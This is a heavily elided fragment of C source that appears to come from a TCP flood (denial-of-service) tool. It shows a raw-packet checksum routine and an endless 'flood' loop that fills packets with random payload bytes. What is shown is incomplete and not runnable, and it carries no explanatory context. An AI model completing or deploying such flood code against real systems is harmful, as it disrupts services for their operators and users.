...
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int payload)
{
	struct tcp_pseudo
	{
	...
	pseudohead.length = htons(sizeof(struct tcphdr) + payload);
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + payload;
	...
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + payload);
...
void *flood(void *par1)
{
	...
	while (1)
	{
		...
		{
			randomPayload[i] = rand_cmwc() % 256; // Big booty slamr
		}
